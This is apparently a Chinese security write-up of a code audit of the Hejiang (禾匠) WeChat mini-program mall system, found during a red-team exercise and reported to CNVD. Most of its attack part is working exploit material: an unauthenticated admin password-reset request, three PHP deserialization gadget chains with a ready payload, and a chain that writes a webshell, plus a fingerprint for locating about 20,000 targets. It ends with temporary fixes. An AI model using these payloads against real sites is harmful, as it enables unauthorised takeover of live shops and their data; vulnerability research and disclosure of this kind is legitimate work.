## **0x01 前言**

在某年某月的一次攻防演练中，比赛难度较大，所有队伍都绕开了正面突破开始钓鱼和社工，场面像极了电信诈骗的现场。作为一名有传统情怀的WEB狗，还是希望能通过WEB站点寻找突破口。

在对目标进行信息搜集的过程中，找到了目标某个子域名开通了微信小程序商城系统，通过找指纹对比，分析出目标使用的系统是“禾匠商城”，由此展开了对这套系统的代码审计之路，文中所提到的漏洞均已提交给CNVD。  
“禾匠商城”是国内使用量较大的小程序建站系统，从指纹搜索结果来看(body="const
_scriptUrl")，目标数量在2W左右，用户基数还是比较大的。![](https://image.3001.net/images/20220531/1653982900_6295c6b44c013cdf0b91f.png!small)![](https://image.3001.net/images/20220531/1653982918_6295c6c65313f23b0ebbc.png!small)

##  **0x02 代码审计**

为了尽可能的复现当时的真实情况，我尽量模拟与当时目标一样的环境（PHP7，disable_functions，WAF等）。只在测试站点进行演示，一般搭建完成之后的禾匠商城界面如下所示。

![](https://image.3001.net/images/20220531/1653982963_6295c6f388e485f10087d.png!small)能直接看到的页面就只是一个登陆口，很多操作都需要登陆才能操作。禾匠是采用YII框架进行二次开发的，整体代码还是比较简洁易懂的。因为采用了YII框架，如果作者不自己作死，还是很难出现SQL注入之类的漏洞。

第一个找到的是一个逻辑漏洞，未登陆情况下可以直接越权重置管理员的密码。定位到漏洞文件controllers/admin/PasswordController.php，这里提供的功能是管理员忘记密码的功能。![](https://image.3001.net/images/20220531/1653983008_6295c720815a28d7afa0a.png!small)继续看这个功能的访问权限，可以看出edit-password竟然和login一样，不需要登录就可以访问，那么我们就可以在未授权的情况下修改管理员admin的密码。![](https://image.3001.net/images/20220531/1653983048_6295c748c9f599e0fc0fa.png!small)

> POST /web/index.php?r=admin%2Fpassport%2Fedit-password HTTP/1.1
>
> Host: www.xxx.com
>
> Cookie: （刷新登陆页获取绘画Cookie）
>
>  
>
>
>
> form%5Bcaptcha%5D=lxcq&form%5Bchecked%5D=false&form%5Busername%5D=admin&form%5Bpass%5D=admin8881&form%5BcheckPass%5D=admin8881&form%5Bmobile%5D=13800000001&user_type=1&mall_id=&_csrf=Sb4pjMU6cTcrKLfqjwJWdhm-d5Zt7J1BWiFUZtiLoDRx9mHJlnAFel9N06G_VhgbL89C_C66-gY2agFTiurvYA%3D%3D

其中form%5Bcaptcha%5D这个是验证码，可以随便填，但必须有。_csrf是用于检验CSRF的随机数，登陆口抓登陆的数据包就可以获取到。form%5Bpass%5D和form%5BcheckPass%5D代表新密码。form%5Busername%5D必须是一个存在的用户名，默认admin是存在的管理员用户。![](https://image.3001.net/images/20220531/1653983115_6295c78b9c1bbfbc19b11.png!small)重置之后，就可以登录用admin/admin8881登录后台了。![](https://image.3001.net/images/20220531/1653983142_6295c7a65b5ef73ea5b9c.png!small)登陆后台最想做的事情肯定是找上传拿权限。然而现实情况是失望的，由于禾匠采用了YII框架，代码中使用的上传也是用的YII自带的上传类，并限制了允许上传文件的后缀，如下图所示。![](https://image.3001.net/images/20220531/1653983169_6295c7c1bdaeb1dc38ed3.png!small)这种白名单的后缀限制是没有办法绕过的，只能找其他getshell的方式。命令执行是没有找到的，但是找到了一个反序列化的漏洞，虽然YII框架本身不存在反序列化漏洞，但是却提供了可供反序列化漏洞的利用链。定位到漏洞文件controllers/api/testOrderSubmit/IndexController.php![](https://image.3001.net/images/20220531/1653983202_6295c7e22ff4f64ce2c39.png!small)继续跟踪decode方法，这是YII处理序列化数据的典型办法，可以看到如果json_decode失败会调用原生的unserialize来进行反序列化，这就会造成反序列化漏洞了。![](https://image.3001.net/images/20220531/1653983238_6295c8062f2da95ad17c9.png!small)下面就是需要构造反序列化利用链了，网上有很多关于YII反序列化利用链的文章，我最终选择的是以这篇文章为基础https://www.anquanke.com/post/id/254429。大佬给我们总结了很多条YII反序列化的利用链，但是实际上能用的不多，可能是版本不一致吧，很多条利用链里面的类在禾匠这边找不到。

首先找到的第一条利用链是可以执行任意无参方法的利用链，可以用这条利用链来执行phpinfo函数。

> <?php
>
>  
>
>
> namespace GuzzleHttp\Psr7 {
>
> class FnStream {
>
> var $_fn_close = "phpinfo";
>
> }
>
> }
>
>  
>
>
> namespace yii\db {
>
> use GuzzleHttp\Psr7\FnStream;
>
> class BatchQueryResult {
>
> private $_dataReader;
>
> public function __construct() {
>
> $this->_dataReader = new FnStream();
>
> }
>
> }
>
> }
>
>  
>
>
> namespace {
>
> use yii\db\BatchQueryResult;
>
> echo urlencode(serialize(new BatchQueryResult()));
>
> }  
  
---  
  
生成的payload替换下面的form_data参数即可。``

    
    
    POST /web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1 HTTP/1.1
    
    Host: www.xxx.com
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 233
    
    form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D

![](https://image.3001.net/images/20220531/1653983492_6295c904a38a132189104.png!small)正常的执行了phpinfo的代码，并且目标站点启用了disable_functions，禁止了一般命令执行的函数。注意，如果这里遇到提示商城id不存在或者已过期这种，就需要修改_mall_id参数，这个参数很容易猜到，基本都是1，2，3中的某个。

第二条找到可以利用的反序列化利用链是下面的利用链，这也是前面文章中给出来的利用链。

> <?php
>
>  
>
>
> namespace yii\rest {
>
> class IndexAction {
>
> public $checkAccess;
>
> public $id;
>
> public function __construct() {
>
> $this->checkAccess="system";
>
> $this->id="calc.exe";
>
> }
>
> }
>
> }
>
>  
>
>
> namespace yii\web {
>
> use yii\rest\IndexAction;
>
> class DbSession {
>
> protected $fields = [];
>
> public $writeCallback;
>
> public function __construct() {
>
> $this->writeCallback=[(new IndexAction),"run"];
>
> $this->fields['1'] = 'aaa';
>
> }
>
>  
>
>
> }
>
> }
>
>  
>
>
> namespace yii\db {
>
> use yii\web\DbSession;
>
> class BatchQueryResult {
>
> private $_dataReader;
>
> public function __construct() {
>
> $this->_dataReader = new DbSession();
>
> }
>
> }
>
> }
>
>  
>
>
> namespace {
>
> use yii\db\BatchQueryResult;
>
> echo urlencode(serialize(new BatchQueryResult()));
>
> }
>
> ?>

本来在测试环境是没有问题的，但是在目标环境中却发现执行的时候因为disable_functions的原因导致system函数执行不成功。虽然从phpinfo看到的信息中可以看出，disable_functions禁用的不严格，是可以绕过的，但是绕过方式均需要多个可控的参数。

![](https://image.3001.net/images/20220531/1653983577_6295c9597627da5a737c6.png!small)

虽然我们现在不能执行命令执行的函数，但是这条链还是给我们提供了一个执行任意只有一个参数的函数的方法。我们的目标是写一个webshell的文件，第一个思路是通过执行单参数方法来写文件，我们想到的方法如下：

1）
通过assert来执行php代码。但是在php7的环境中assert不再是函数，而是关键字。是不能通过call_user_func来回调执行的，所以这条路失败了。

2）
通过文件包含include或者require来包含本地文件执行php代码。但是实际测试的结果来看，include和require也不是函数，只是关键字。

3） 通过file_put_contents或者fwrite来写文件，但是这两个函数都需要传递至少两个参数。

这条路遇到了困难，虽然现在我们能执行任意单参数方法，但是还是不能执行系统命令或者写文件。第二个思路扩展反序列化利用链，从执行任意单参数方法变成执行任意两个参数方法。

在实战环境下现做代码审计还是有时间压力的，在不停翻看代码后，最终还是找到了一条Alipay\AlipayRequester类的execute方法来扩展利用链，如下图所示。![](https://image.3001.net/images/20220531/1653983604_6295c97442271608af1e7.png!small)可以看出execute方法直接调用了call_user_func方法，第二个参数$params可控，第一个参数$this->getUrl()也可控，只是会有一些特殊字符（所以这条利用链只适用于linux环境，如果是windows环境会因为特殊字符的存在而导致生成文件不成功）。完整的利用链如下：

> <?php
>
>  
>
>
> namespace Alipay {
>
> class AlipayRequester {
>
> public $callback = "file_put_contents";
>
> public $gateway = "xxxx";
>
> public $charset = "334.php";
>
> }
>
> }
>
>  
>
>
> namespace yii\rest {
>
> use Alipay\AlipayRequester;
>
> class IndexAction {
>
> public $checkAccess;
>
> public $id;
>
> public function __construct() {
>
> $this->checkAccess=[(new AlipayRequester),"execute"];
>
> $this->id='<?php $a="fwrite";$h = fopen($_REQUEST[f], "a");$a($h,
> htmlspecialchars_decode(htmlspecialchars_decode($_REQUEST[c])));';
>
> }
>
> }
>
> }
>
>  
>
>
> namespace yii\web {
>
> use yii\rest\IndexAction;
>
> class DbSession {
>
> protected $fields = [];
>
> public $writeCallback;
>
> public function __construct() {
>
> $this->writeCallback=[(new IndexAction),"run"];
>
> $this->fields['1'] = 'aaa';
>
> }
>
>  
>
>
> }
>
> }
>
>  
>
>
> namespace yii\db {
>
> use yii\web\DbSession;
>
> class BatchQueryResult {
>
> private $_dataReader;
>
> public function __construct() {
>
> $this->_dataReader = new DbSession();
>
> }
>
> }
>
> }
>
>  
>
>
> namespace {
>
> use yii\db\BatchQueryResult;
>
> echo urlencode(serialize(new BatchQueryResult()));
>
> }
>
> ?>

使用上面的payload之后，会在目标根目录生成一个文件名是“xxxx?charset=333.php”的文件，内容是$this->id里面的值。如果是windows的环境，还有另一条利用链，留给喜欢阅读动手的小伙伴自己研究了。

##  **0x03 结论**

拿到这套系统的源码，粗略一看觉得采用了知名框架很安全，但是实际上还是有不少的问题的，本人只是提出了一个越权的的漏洞和一个反序列化的漏洞。作者相信，这套系统还有其他的漏洞，但是因为已经拿到了想要的权限，就没有继续深入了。如果遇到反序列化不成功，大概是yii的版本不匹配导致的。

最后，悄悄的告诉你，不需要修改管理员密码也可以反序列化，反序列化是未授权的，这两个是完全独立的漏洞。

##  **0x04 修复建议**

未授权访问和反序列化漏洞均已报送给CNVD 平台  
临时修复建议：注释掉controllers/admin/PasswordController.php里的actionEditPassword函数和controllers/api/testOrderSubmit/IndexController.php里的actionPreview函数![](https://image.3001.net/images/20220531/1653983726_6295c9ee92695eda35d07.png!small)![](https://image.3001.net/images/20220531/1653983740_6295c9fcd7b2729fcebac.png!small)  

